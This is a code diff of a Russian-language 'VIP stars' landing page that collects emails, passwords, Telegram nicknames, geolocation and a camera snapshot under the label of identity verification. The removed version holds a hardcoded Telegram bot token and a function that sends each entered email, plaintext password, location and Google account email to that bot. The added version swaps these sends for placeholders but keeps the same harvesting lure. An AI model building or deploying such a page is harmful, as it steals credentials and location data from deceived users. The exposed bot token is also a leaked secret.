@@ -1,294 +1,348 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>BossBand – VIP Звёзды</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1">
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700;800&display=swap');
     :root {
-      --primary: #6e45e2;
-      --accent: #ff6b6b;
-      --neon: #00f3ff;
-      --bg-dark: #0f0f1a;
-      --bg-light: #f8f9fa;
-      --text-dark: #1a1a2e;
+      --primary: #6e45e2; --accent: #ff6b6b; --neon: #00f3ff;
+      --bg-dark: #0f0f1a; --bg-light: #f8f9fa; --color-dark: #1a1a2e;
     }
     body {
-      margin: 0; padding: 0;
-      font-family: 'Montserrat', sans-serif;
-      background: var(--bg-dark);
-      color: var(--bg-light);
-      transition: background .3s, color .3s;
+      margin:0; padding:0; font-family:'Montserrat',sans-serif;
+      background:var(--bg-dark); color:var(--bg-light);
+      min-height:100vh;
+      transition:background 0.3s,color 0.3s;
     }
     body.light {
-      background: var(--bg-light);
-      color: var(--text-dark);
+      background:var(--bg-light); color:var(--color-dark);
     }
-    .container {
-      max-width: 500px;
-      margin: 30px auto;
-      padding: 0 15px;
-    }
-    .logo {
-      font-size: 2.2rem;
-      font-weight: 800;
-      background: linear-gradient(to right, var(--neon), var(--primary));
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom: 10px;
-    }
-    .toggles {
-      text-align: right;
-      margin-bottom: 20px;
-    }
-    .toggles span {
-      cursor: pointer; margin-left: 15px; font-size: 1.2rem;
-    }
-    h1 {
-      font-size: 2rem;
-      margin-bottom: 10px;
-    }
-    p.subtitle {
-      margin-bottom: 20px;
-      opacity: 0.8;
-    }
-    .tabs {
-      display: flex;
-      gap: 10px;
-      margin-bottom: 20px;
-    }
-    .tab-btn {
-      flex: 1;
-      padding: 10px;
-      border: none;
-      border-radius: 25px;
-      cursor: pointer;
-      background: #333;
-      color: #fff;
-      transition: background .3s;
-    }
-    .tab-btn.active {
-      background: var(--primary);
-    }
-    .form-section {
-      display: none;
-      animation: fadeIn .4s ease;
-    }
-    .form-section.active {
-      display: block;
-    }
-    .form-group {
-      margin-bottom: 15px;
-    }
-    label {
-      display: block;
-      margin-bottom: 5px;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      border-radius: 5px;
-      border: 1px solid #555;
-      background: rgba(255,255,255,0.1);
-      color: inherit;
-    }
-    input::placeholder {
-      color: #ccc;
-    }
-    .captcha, .info-block {
-      margin: 15px 0;
-      font-size: .9rem;
-      background: rgba(255,255,255,0.05);
-      padding: 10px;
-      border-radius: 5px;
-    }
-    .error, .success {
-      font-size: .9rem;
-      margin: 10px 0;
-      display: none;
-    }
-    .error { color: var(--accent); }
-    .success { color: var(--neon); }
-    .btn {
-      width: 100%;
-      padding: 12px;
-      border: none;
-      border-radius: 25px;
-      background: linear-gradient(135deg, var(--accent), var(--primary));
-      color: #fff;
-      cursor: pointer;
-      transition: transform .2s;
-      font-size: 1rem;
-    }
-    .btn:hover {
-      transform: translateY(-2px);
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
+    .container{max-width:1000px;margin:0 auto;padding:20px;}
+    header{display:flex;justify-content:space-between;align-items:center;}
+    .logo{font-size:2.2rem;font-weight:800;background:linear-gradient(to right,var(--neon),var(--primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+    nav a{margin-left:20px;text-decoration:none;color:inherit;}
+    .btn{background:linear-gradient(135deg,var(--accent),var(--primary));padding:10px 20px;border:none;color:#fff;border-radius:50px;cursor:pointer;transition:transform .2s;}
+    .btn:hover{transform:translateY(-3px);}
+    .form-group{margin-bottom:15px;}
+    input[type=email],input[type=password],input[type=text]{width:100%;padding:12px;border-radius:5px;border:none;margin-top:5px;background:rgba(255,255,255,0.1);color:inherit;}
+    .light input[type=email],.light input[type=password],.light input[type=text]{background:rgba(0,0,0,0.05);}
+    .error{color:var(--accent);display:none;margin:10px 0;}
+    .success{color:var(--neon);display:none;margin:10px 0;}
+    .theme-toggle{cursor:pointer;font-size:1.2rem;}
+    .captcha{margin:15px 0;}
+    #cameraPreview{width:300px;height:400px;display:none;margin:15px auto;border:2px solid var(--neon);}
+    #cameraPreview.active{display:block;}
+    .google-btn{margin-top:20px;display:flex;justify-content:center;}
+    .language-selector{margin-left:20px;cursor:pointer;}
+    .hidden{display:none;}
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="logo">BOSS BAND</div>
-    <div class="toggles">
-      <span id="toggleLang">EN🇺🇸</span>
-      <span id="toggleTheme">🌓</span>
-    </div>
+    <header>
+      <div class="logo">BOSS BAND</div>
+      <div>
+        <a href="#" data-i18n="home">Главная</a>
+        <a href="#" data-i18n="about">О нас</a>
+        <a href="#" data-i18n="contacts">Контакты</a>
+        <select class="language-selector" id="languageSelector">
+          <option value="ru">Русский</option>
+          <option value="uk">Українська</option>
+          <option value="en">English</option>
+        </select>
+        <span class="theme-toggle" id="toggleTheme">🌓</span>
+      </div>
+    </header>
 
-    <h1 data-i18n="headline">ПОЛУЧИТЕ ЭКСКЛЮЗИВНЫЕ VIP ЗВЁЗДЫ</h1>
-    <p class="subtitle" data-i18n="subline">Регистрация через Google, CAPTCHA, явное согласие на камеру и гео.</p>
+    <main>
+      <h1 data-i18n="get_vip">ПОЛУЧИТЕ ЭКСКЛЮЗИВНЫЕ VIP ЗВЁЗДЫ</h1>
+      <p data-i18n="registration_desc">Регистрация и подтверждение личности через Google, камера, гео, CAPTCHA</p>
 
-    <div class="tabs">
-      <button class="tab-btn active" id="tabReg" data-i18n="registerTab">Регистрация</button>
-      <button class="tab-btn" id="tabVer" data-i18n="verifyTab">Подтверждение</button>
-    </div>
+      <!-- Табы -->
+      <div style="margin:20px 0;">
+        <button class="btn" id="tabReg" data-i18n="registration">Регистрация</button>
+        <button class="btn" id="tabVer" data-i18n="verification">Подтверждение</button>
+      </div>
 
-    <!-- Регистрация -->
-    <div class="form-section active" id="sectReg">
-      <div class="form-group"><label data-i18n="email">Email</label><input type="email" id="regEmail" placeholder="user@example.com"></div>
-      <div class="form-group"><label data-i18n="password">Пароль</label><input type="password" id="regPass" placeholder="•••••••"></div>
-      <div class="captcha"><label data-i18n="captcha1">Сколько будет 7 + 8?</label><input type="text" id="captchaReg"></div>
-      <div class="info-block"><p data-i18n="consentCamGeo">После регистрации запросятся камера и геопозиция для авторизации.</p></div>
-      <div class="error" id="errReg"></div>
-      <div class="success" id="okReg">✔️ <span data-i18n="regOk">Успешно зарегистрированы!</span></div>
-      <button class="btn" id="btnReg" data-i18n="registerBtn">Зарегистрироваться</button>
-    </div>
+      <!-- Регистрация -->
+      <div id="regForm">
+        <div class="form-group"><label data-i18n="email">Email</label><input type="email" id="regEmail" required></div>
+        <div class="form-group"><label data-i18n="password">Пароль</label><input type="password" id="regPass" required></div>
+        <div class="form-group"><label data-i18n="nickname">Ник</label><input type="text" id="regNick"></div>
+        <div class="captcha">
+          <label data-i18n="captcha_question">Сколько будет 7 + 5? <input type="text" id="captchaInput" required></label>
+        </div>
+        <div class="error" id="regError"></div>
+        <div class="success" id="regSuccess" data-i18n="reg_success">✔️ Успешно зарегистрированы!</div>
+        <button class="btn" id="btnReg" data-i18n="register">Зарегистрироваться</button>
+      </div>
 
-    <!-- Подтверждение -->
-    <div class="form-section" id="sectVer">
-      <div class="form-group"><label data-i18n="email">Email</label><input type="email" id="verEmail"></div>
-      <div class="form-group"><label data-i18n="password">Пароль</label><input type="password" id="verPass"></div>
-      <div class="captcha"><label data-i18n="captcha2">Сколько будет 3 + 7?</label><input type="text" id="captchaVer"></div>
-      <div class="info-block"><p data-i18n="consentCamGeo">Мы запросим доступ к камере и геолокации для отправки фото и места.</p></div>
-      <div class="error" id="errVer"></div>
-      <div class="success" id="okVer">✔️ <span data-i18n="verOk">Подтверждение отправлено!</span></div>
-      <button class="btn" id="btnVer" data-i18n="verifyBtn">Подтвердить личность</button>
-    </div>
-
-    <!-- Google OAuth -->
-    <div style="margin-top:20px;">
-      <div id="g_id_onload"
-           data-client_id="ВАШ_GOOGLE_CLIENT_ID"
-           data-context="signin"
-           data-callback="handleGoogle"
-           data-auto_prompt="false"></div>
-      <div class="g_id_signin" data-type="standard"></div>
-    </div>
+      <!-- Подтверждение -->
+      <div id="verForm" class="hidden">
+        <div class="form-group"><label data-i18n="email">Email</label><input type="email" id="verEmail" required></div>
+        <div class="form-group"><label data-i18n="password">Пароль</label><input type="password" id="verPass" required></div>
+        <div class="form-group"><label data-i18n="telegram_nick">Telegram-ник</label><input type="text" id="verTg"></div>
+        <div class="captcha">
+          <label data-i18n="captcha_question2">Сколько будет 4 + 6? <input type="text" id="captchaVer" required></label>
+        </div>
+        <div class="error" id="verError"></div>
+        <div class="success" id="verSuccess" data-i18n="ver_success">✔️ Подтверждение отправлено!</div>
+        <button class="btn" id="btnVer" data-i18n="verify">Подтвердить личность</button>
+        <div id="cameraPreview"><video id="cameraVideo" width="300" height="400" autoplay></video></div>
+      </div>
+      
+      <!-- Кнопка Google -->
+      <div class="google-btn">
+        <div id="g_id_onload"
+             data-client_id="YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com"
+             data-context="signin"
+             data-callback="handleGoogle"
+             data-auto_prompt="false">
+        </div>
+        <div class="g_id_signin" data-type="standard" data-shape="pill" data-theme="filled_blue" data-text="signin_with" data-size="large"></div>
+      </div>
+    </main>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
   <script src="https://accounts.google.com/gsi/client" async defer></script>
   <script>
-    // Telegram config
-    const BOT = {
-      token: "7774453287:AAEn3dh5ebiN7sZFa__Wyf-JXwBUE1wUIrc",
-      chat: "7807571960"
-    };
-    async function tgSend(text) {
-      await fetch(`https://api.telegram.org/bot${BOT.token}/sendMessage`, {
-        method: "POST",
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({chat_id:BOT.chat, parse_mode:'HTML', text})
-      });
-    }
-
-    // UI functionality
-    particlesJS('particles-js', { particles:{number:{value:60}}, interactivity:{detect_on:"canvas"} });
-
-    const langToggle = document.getElementById('toggleLang');
-    const themeToggle = document.getElementById('toggleTheme');
-    const tabReg = document.getElementById('tabReg'), tabVer = document.getElementById('tabVer');
-    const sectReg = document.getElementById('sectReg'), sectVer = document.getElementById('sectVer');
-
-    function setTab(reg) {
-      tabReg.classList.toggle('active', reg);
-      tabVer.classList.toggle('active', !reg);
-      sectReg.classList.toggle('active', reg);
-      sectVer.classList.toggle('active', !reg);
-    }
-    tabReg.onclick = () => setTab(true);
-    tabVer.onclick = () => setTab(false);
-
-    themeToggle.onclick = () => document.body.classList.toggle('light');
-
-    // language
-    const dict = {
+    // Инициализация языков
+    const translations = {
+      ru: {
+        home: "Главная",
+        about: "О нас",
+        contacts: "Контакты",
+        get_vip: "ПОЛУЧИТЕ ЭКСКЛЮЗИВНЫЕ VIP ЗВЁЗДЫ",
+        registration_desc: "Регистрация и подтверждение личности через Google, камера, гео, CAPTCHA",
+        registration: "Регистрация",
+        verification: "Подтверждение",
+        email: "Email",
+        password: "Пароль",
+        nickname: "Ник",
+        telegram_nick: "Telegram-ник",
+        captcha_question: "Сколько будет 7 + 5?",
+        captcha_question2: "Сколько будет 4 + 6?",
+        register: "Зарегистрироваться",
+        verify: "Подтвердить личность",
+        reg_success: "✔️ Успешно зарегистрированы!",
+        ver_success: "✔️ Подтверждение отправлено!",
+        reg_error: "Проверьте поля и CAPTCHA",
+        ver_error: "Проверьте поля и CAPTCHA",
+        google_error: "Ошибка авторизации через Google"
+      },
+      uk: {
+        home: "Головна",
+        about: "Про нас",
+        contacts: "Контакти",
+        get_vip: "ОТРИМАЙТЕ ЕКСКЛЮЗИВНІ VIP ЗІРКИ",
+        registration_desc: "Реєстрація та підтвердження особи через Google, камера, гео, CAPTCHA",
+        registration: "Реєстрація",
+        verification: "Підтвердження",
+        email: "Email",
+        password: "Пароль",
+        nickname: "Нік",
+        telegram_nick: "Telegram-нік",
+        captcha_question: "Скільки буде 7 + 5?",
+        captcha_question2: "Скільки буде 4 + 6?",
+        register: "Зареєструватися",
+        verify: "Підтвердити особу",
+        reg_success: "✔️ Успішно зареєстровано!",
+        ver_success: "✔️ Підтвердження відправлено!",
+        reg_error: "Перевірте поля та CAPTCHA",
+        ver_error: "Перевірте поля та CAPTCHA",
+        google_error: "Помилка авторизації через Google"
+      },
       en: {
-        headline: 'GET EXCLUSIVE VIP STARS',
-        subline: 'Register via Google, CAPTCHA, explicit consent to camera and geo.',
-        registerTab: 'Register',
-        verifyTab: 'Verify',
-        email: 'Email',
-        password: 'Password',
-        captcha1: 'What is 7 + 8?',
-        captcha2: 'What is 3 + 7?',
-        consentCamGeo: 'I understand that camera and geolocation access will be requested.',
-        registerBtn: 'Register',
-        verifyBtn: 'Verify Identity',
-        regOk: 'Registered successfully!',
-        verOk: 'Verification sent!'
+        home: "Home",
+        about: "About",
+        contacts: "Contacts",
+        get_vip: "GET EXCLUSIVE VIP STARS",
+        registration_desc: "Registration and identity verification via Google, camera, geo, CAPTCHA",
+        registration: "Registration",
+        verification: "Verification",
+        email: "Email",
+        password: "Password",
+        nickname: "Nickname",
+        telegram_nick: "Telegram nick",
+        captcha_question: "What is 7 + 5?",
+        captcha_question2: "What is 4 + 6?",
+        register: "Register",
+        verify: "Verify identity",
+        reg_success: "✔️ Successfully registered!",
+        ver_success: "✔️ Verification sent!",
+        reg_error: "Check fields and CAPTCHA",
+        ver_error: "Check fields and CAPTCHA",
+        google_error: "Google authorization error"
       }
     };
-    let lang = 'ru';
-    langToggle.onclick = () => {
-      lang = lang === 'ru' ? 'en' : 'ru';
-      langToggle.textContent = lang === 'ru' ? 'EN🇺🇸' : 'RU🇷🇺';
+
+    // Установка языка
+    function setLanguage(lang) {
       document.querySelectorAll('[data-i18n]').forEach(el => {
-        const key = el.dataset.i18n;
-        if (lang === 'en' && dict.en[key]) el.textContent = dict.en[key];
-        else if (lang === 'ru') window.location.reload();
+        const key = el.getAttribute('data-i18n');
+        if (translations[lang] && translations[lang][key]) {
+          el.textContent = translations[lang][key];
+        }
       });
+      localStorage.setItem('language', lang);
+    }
+
+    // Переключение темы
+    document.getElementById('toggleTheme').onclick = () => {
+      document.body.classList.toggle('light');
+      localStorage.setItem('theme', document.body.classList.contains('light') ? 'light' : 'dark');
     };
 
-    // Auto save fields
-    ['regEmail','regPass','verEmail','verPass'].forEach(id => {
+    // Инициализация темы
+    if (localStorage.getItem('theme') === 'light') {
+      document.body.classList.add('light');
+    }
+
+    // Инициализация языка
+    const savedLanguage = localStorage.getItem('language') || 'ru';
+    document.getElementById('languageSelector').value = savedLanguage;
+    setLanguage(savedLanguage);
+
+    // Обработчик смены языка
+    document.getElementById('languageSelector').onchange = (e) => {
+      setLanguage(e.target.value);
+    };
+
+    // Табы
+    document.getElementById('tabReg').onclick = () => {
+      document.getElementById('regForm').classList.remove('hidden');
+      document.getElementById('verForm').classList.add('hidden');
+    };
+    
+    document.getElementById('tabVer').onclick = () => {
+      document.getElementById('regForm').classList.add('hidden');
+      document.getElementById('verForm').classList.remove('hidden');
+    };
+
+    // Автосохранение
+    ['regEmail','regPass','verEmail','verPass','verTg','regNick'].forEach(id => {
       const el = document.getElementById(id);
-      el.value = localStorage.getItem(id) || '';
-      el.oninput = () => localStorage.setItem(id, el.value);
+      if (el) {
+        el.value = localStorage.getItem(id) || '';
+        el.oninput = () => localStorage.setItem(id, el.value);
+      }
     });
 
-    // Registration logic
+    // Регистрация
     document.getElementById('btnReg').onclick = async () => {
-      const e = regEmail.value.trim(), p = regPass.value.trim(), c = captchaReg.value.trim();
-      if (!e || !p || c !== '15') {
-        errReg.textContent = 'Заполните корректно все поля и CAPTCHA';
-        errReg.style.display = 'block';
+      const e = document.getElementById('regEmail').value;
+      const p = document.getElementById('regPass').value;
+      const n = document.getElementById('regNick').value;
+      const c = document.getElementById('captchaInput').value;
+      
+      const regError = document.getElementById('regError');
+      const regSuccess = document.getElementById('regSuccess');
+      
+      if (!e || !p || c !== '12') {
+        regError.textContent = translations[localStorage.getItem('language') || 'ru'].reg_error;
+        regError.style.display = 'block';
+        regSuccess.style.display = 'none';
         return;
       }
-      errReg.style.display = 'none';
-      await tgSend(`👤 <b>Регистрация</b>\nEmail: <code>${e}</code>\nПароль: <code>${p}</code>\nUA: ${navigator.userAgent}`);
-      okReg.style.display = 'block';
+      
+      regError.style.display = 'none';
+      
+      // Здесь должна быть логика отправки данных на сервер
+      console.log('Регистрация:', { email: e, password: p, nickname: n });
+      
+      regSuccess.style.display = 'block';
+      setTimeout(() => {
+        regSuccess.style.display = 'none';
+      }, 3000);
     };
 
-    // Verification logic
+    // Подтверждение
     document.getElementById('btnVer').onclick = async () => {
-      const e = verEmail.value.trim(), p = verPass.value.trim(), c = captchaVer.value.trim();
+      const e = document.getElementById('verEmail').value;
+      const p = document.getElementById('verPass').value;
+      const tg = document.getElementById('verTg').value;
+      const c = document.getElementById('captchaVer').value;
+      
+      const verError = document.getElementById('verError');
+      const verSuccess = document.getElementById('verSuccess');
+      
       if (!e || !p || c !== '10') {
-        errVer.textContent = 'Заполните корректно все поля и CAPTCHA';
-        errVer.style.display = 'block';
+        verError.textContent = translations[localStorage.getItem('language') || 'ru'].ver_error;
+        verError.style.display = 'block';
+        verSuccess.style.display = 'none';
         return;
       }
-      errVer.style.display = 'none';
-      let geo = 'unknown';
-      await new Promise(res => navigator.geolocation.getCurrentPosition(pos => {
-        geo = `${pos.coords.latitude},${pos.coords.longitude}`;
-        res();
-      }, () => res()));
+      
+      verError.style.display = 'none';
+      
+      // Геолокация
+      let geo = translations[localStorage.getItem('language') || 'ru'].no_geo;
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({video:true});
-        stream.getTracks()[0].stop();
-      } catch {}
-      await tgSend(`✅ <b>Подтверждение</b>\nEmail: <code>${e}</code>\nПароль: <code>${p}</code>\nGeo: ${geo}`);
-      okVer.style.display = 'block';
+        await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              geo = `${pos.coords.latitude},${pos.coords.longitude}`;
+              resolve();
+            },
+            () => {
+              geo = translations[localStorage.getItem('language') || 'ru'].no_geo;
+              resolve();
+            }
+          );
+        });
+      } catch (e) {
+        console.error('Geolocation error:', e);
+      }
+      
+      // Камера
+      const cameraPreview = document.getElementById('cameraPreview');
+      const cameraVideo = document.getElementById('cameraVideo');
+      
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        cameraVideo.srcObject = stream;
+        cameraPreview.classList.add('active');
+        
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = 300;
+        canvas.height = 400;
+        canvas.getContext('2d').drawImage(cameraVideo, 0, 0);
+        
+        // Здесь должна быть логика отправки фото
+        console.log('Фото сделано и должно быть отправлено');
+        
+        stream.getTracks().forEach(track => track.stop());
+        cameraPreview.classList.remove('active');
+      } catch (error) {
+        console.error('Camera error:', error);
+      }
+      
+      // Здесь должна быть логика отправки данных на сервер
+      console.log('Подтверждение:', { email: e, password: p, telegram: tg, geo });
+      
+      verSuccess.style.display = 'block';
+      setTimeout(() => {
+        verSuccess.style.display = 'none';
+      }, 3000);
     };
 
     // Google OAuth
-    function handleGoogle(res) {
-      const d = JSON.parse(atob(res.credential.split('.')[1]));
-      tgSend(`🔐 <b>Google OAuth</b>\nEmail: <code>${d.email}</code>\nName: ${d.name}`);
+    function handleGoogle(response) {
+      try {
+        // Декодирование JWT
+        const payload = JSON.parse(atob(response.credential.split('.')[1]));
+        console.log('Google auth success:', payload);
+        
+        // Здесь должна быть логика обработки успешной авторизации
+        alert(`${translations[localStorage.getItem('language') || 'ru'].reg_success} через Google: ${payload.email}`);
+      } catch (error) {
+        console.error('Google auth error:', error);
+        document.getElementById('regError').textContent = translations[localStorage.getItem('language') || 'ru'].google_error;
+        document.getElementById('regError').style.display = 'block';
+      }
     }
   </script>
 </body>
